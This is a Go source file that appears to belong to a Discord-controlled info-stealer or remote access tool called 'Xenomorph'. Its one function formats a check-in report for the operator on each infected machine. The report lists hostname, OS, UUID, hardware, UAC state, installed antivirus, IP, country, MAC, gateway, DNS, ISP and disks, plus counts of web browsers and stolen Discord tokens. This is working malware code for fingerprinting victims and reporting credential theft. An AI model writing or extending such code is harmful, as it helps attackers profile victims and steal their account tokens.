package embeds

import (
	"strconv"

	"github.com/bwmarrin/discordgo"
	"github.com/codevault-llc/xenomorph/internal/common"
)

func ConnectionEmbed(data *common.ClientData) discordgo.MessageEmbed {
	diskFields := SplitField("__**Disks**__", Codeblock(data.Disks))

	messageEmbed := discordgo.MessageEmbed{
		Title: "Xenomorph **`[Connection]`**",
		Fields: []*discordgo.MessageEmbedField{
			{
				Name: "__**Computer Info**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "Computer Name", Value: data.ComputerName},
					{Name: "Computer OS", Value: data.ComputerOS},
					{Name: "Computer Version", Value: data.ComputerVersion},
					{Name: "Total Memory", Value: strconv.FormatUint(data.TotalMemory, 10)},
					{Name: "Up Time", Value: data.UpTime},
					{Name: "UUID", Value: data.UUID},
					{Name: "CPU", Value: data.CPU},
					{Name: "GPU", Value: data.GPU},
					{Name: "UAC", Value: strconv.FormatBool(data.UAC)},
					{Name: "Anti Virus", Value: data.AntiVirus},
				})),
			},
			{
				Name: "__**Network Info**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "IP Address", Value: data.IPAddress},
					{Name: "Country", Value: data.Country},
					{Name: "Time Zone", Value: data.Timezone},
					{Name: "MAC Address", Value: data.MACAddress},
					{Name: "Gateway", Value: data.Gateway},
					{Name: "Subnet Mask", Value: data.SubnetMask},
					{Name: "DNS", Value: data.DNS},
					{Name: "ISP", Value: data.ISP},
				})),
			},
			{
				Name:  "__**Network Interfaces**__",
				Value: Codeblock(data.Wifi),
			},
			{
				Name: "__**Apps**__",
				Value: Codeblock(DisplayFieldList([]Field{
					{Name: "Web Browsers", Value: strconv.Itoa(len(data.Webbrowsers))},
					{Name: "Discord Tokens", Value: strconv.Itoa(len(data.DiscordTokens))},
				})),
			},
		},
		Color: 0x00ff00,
	}

	messageEmbed.Fields = append(messageEmbed.Fields, diskFields...)

	return messageEmbed
}
